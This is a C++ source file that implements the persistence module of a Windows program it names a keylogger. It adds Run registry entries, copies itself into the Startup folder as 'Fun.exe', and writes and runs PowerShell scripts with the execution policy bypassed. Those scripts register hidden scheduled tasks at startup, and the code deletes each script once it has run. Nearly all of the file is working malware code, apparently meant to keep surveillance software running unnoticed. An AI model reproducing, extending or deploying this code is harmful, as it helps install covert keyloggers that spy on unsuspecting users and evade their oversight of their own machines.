#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <Shlobj.h>
#include <cstdlib>
#include <fstream>
#include <string>
#include "persistence.h"
#include <shlwapi.h> // For PathFindFileName

// Link with Windows Socket API and Common Controls libraries.
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Shlwapi.lib") // Link Shlwapi.lib

std::wstring getDynamicAppName() {
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path. Error code: " << GetLastError() << std::endl;
        return L"";
    }
    // Extract the file name from the full path
    return std::wstring(PathFindFileNameW(exePath));
}
// Configures an application to auto-start by adding it to the Windows Registry.
bool configureAutoStart(const std::wstring& appName, const std::wstring& appPath) {
    HKEY keyHandle;
    LONG opResult = RegOpenKeyExW(HKEY_CURRENT_USER,
                                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                  0, KEY_SET_VALUE, &keyHandle);

    if (opResult != ERROR_SUCCESS) {
        return false;
    }

    opResult = RegSetValueExW(keyHandle, appName.c_str(), 0, REG_SZ,
                              reinterpret_cast<const BYTE*>(appPath.c_str()),
                              (appPath.size() + 1) * sizeof(wchar_t));

    RegCloseKey(keyHandle);
    return opResult == ERROR_SUCCESS;
}


bool checkAutoStartEnabled(const std::wstring& appName) {
    HKEY keyHandle;
    LONG opResult = RegOpenKeyExW(HKEY_CURRENT_USER,
                                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                  0, KEY_QUERY_VALUE, &keyHandle);

    if (opResult != ERROR_SUCCESS) {
        return false;
    }

    opResult = RegQueryValueExW(keyHandle, appName.c_str(), NULL, NULL, NULL, NULL);
    RegCloseKey(keyHandle);
    return opResult == ERROR_SUCCESS;
}



// Main function for setting up persistence.
int setupPersistence() {
    std::wstring appAlias = getDynamicAppName();
    if (appAlias.empty()) {
        std::cerr << "Failed to retrieve application name." << std::endl;
        return 1;
    }

    wchar_t appExecutablePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, appExecutablePath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return 1;
    }

    if (checkAutoStartEnabled(appAlias)) {
        std::wcout << L"Auto-start already configured for " << appAlias << L".\n";
    } else {
        if (configureAutoStart(appAlias, appExecutablePath)) {
            std::wcout << L"Auto-start configured successfully for " << appAlias << L".\n";
        } else {
            std::wcerr << L"Failed to configure auto-start for " << appAlias << L".\n";
        }
    }

    return 0;
}


// Function to copy the current executable to the Startup folder
bool copyToStartupFolder() {
    wchar_t currentPath[MAX_PATH];
    wchar_t startupPath[MAX_PATH];

    // Get the full path of the current executable
    if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[ERROR] Failed to get executable path. Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Get the path to the user's Startup folder
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        std::wstring destinationPath = std::wstring(startupPath) + L"\\Fun.exe";

        // Copy the file to the Startup folder
        if (CopyFileW(currentPath, destinationPath.c_str(), FALSE)) {
            // std::wcout << L"[SUCCESS] File copied to: " << destinationPath << std::endl;
            return true;
        } else {
            // std::cerr << "[ERROR] Failed to copy file. Error code: " << GetLastError() << std::endl;
            return false;
        }
    } else {
        // std::cerr << "[ERROR] Failed to get Startup folder path." << std::endl;
        return false;
    }
}


// Sets up and runs a scheduled task using a PowerShell script.
void setupAndRunScheduledTask() {
    std::string scriptFilename = "ScheduledTaskScript.ps1";
    std::ofstream scriptFile(scriptFilename);

    if (!scriptFile.is_open()) {
        std::cerr << "Failed to open file for writing." << std::endl;
        return;
    }

    // Write the PowerShell script to create and register a scheduled task.
    scriptFile << "$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n\n";
    scriptFile << "$Action = New-ScheduledTaskAction -Execute \"Ruta\\de\\tu\\aplicación.exe\"\n\n";
    scriptFile << "$Trigger = New-ScheduledTaskTrigger -AtStartup\n\n";
    scriptFile << "$Principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive\n\n";
    scriptFile << "$Settings = New-ScheduledTaskSettingsSet -Hidden\n\n";
    scriptFile << "$Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger -Settings $Settings\n\n";
    scriptFile << "Register-ScheduledTask \"NombreDeLaTarea\" -InputObject $Task\n";

    scriptFile.close();

    std::cout << "PS1 file successfully created: " << scriptFilename << std::endl;
    // Execute the PowerShell script.
    std::string cmd = "PowerShell -ExecutionPolicy Bypass -File " + scriptFilename;
    system(cmd.c_str());

    // Delete the PowerShell script file after execution.
    if (remove(scriptFilename.c_str()) != 0) {
        std::perror("Error deleting the file");
    }
    else {
        std::cout << "PS1 file successfully deleted!" << std::endl;
    }
}

void setupRegistryPersistence() {
    LPCTSTR appAlias = _T("KeyloggerApp");
    TCHAR appPath[MAX_PATH];

    // Get the full path of the current executable.
    if (GetModuleFileName(NULL, appPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return;
    }

#ifdef _UNICODE
    // Convert LPCTSTR to std::wstring directly when using Unicode
    std::wstring appAliasW(appAlias);
    std::wstring appPathW(appPath);
#else
    // Convert LPCTSTR (char*) to std::wstring when not using Unicode
    std::wstring appAliasW = std::wstring(appAlias, appAlias + strlen(appAlias));
    std::wstring appPathW = std::wstring(appPath, appPath + strlen(appPath));
#endif

    // Check if auto-start is already configured.
    if (checkAutoStartEnabled(appAliasW)) {
        std::wcout << L"[INFO] Auto-start already configured for " << appAliasW << L"." << std::endl;
    } else {
        // Configure auto-start.
        if (configureAutoStart(appAliasW, appPathW)) {
            std::wcout << L"[INFO] Keylogger successfully added to auto-start." << std::endl;
        } else {
            std::wcerr << L"[ERROR] Failed to add keylogger to auto-start." << std::endl;
        }
    }
}

// Function to create a scheduled task using a PowerShell script.
void setupScheduledTaskPersistence() {
    std::string scriptFilename = "KeyloggerScheduledTask.ps1";
    std::ofstream scriptFile(scriptFilename);

    if (!scriptFile.is_open()) {
        std::cerr << "Failed to create PowerShell script file." << std::endl;
        return;
    }

    // Get the full path of the current executable.
    char appPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, appPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return;
    }

    // Write the PowerShell script.
    scriptFile << "$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n";
    scriptFile << "$Action = New-ScheduledTaskAction -Execute \"" << appPath << "\"\n";
    scriptFile << "$Trigger = New-ScheduledTaskTrigger -AtStartup\n";
    scriptFile << "$Principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive\n";
    scriptFile << "$Settings = New-ScheduledTaskSettingsSet -Hidden\n";
    scriptFile << "$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings\n";
    scriptFile << "Register-ScheduledTask -TaskName \"KeyloggerTask\" -InputObject $Task\n";

    scriptFile.close();

    // Execute the PowerShell script.
    std::string cmd = "PowerShell -ExecutionPolicy Bypass -File " + scriptFilename;
    if (system(cmd.c_str()) != 0) {
        std::cerr << "[ERROR] Failed to create scheduled task." << std::endl;
    } else {
        std::cout << "[INFO] Scheduled task created successfully." << std::endl;
    }

    // Clean up the script file.
    if (remove(scriptFilename.c_str()) != 0) {
        std::cerr << "[ERROR] Failed to delete PowerShell script file." << std::endl;
    }
}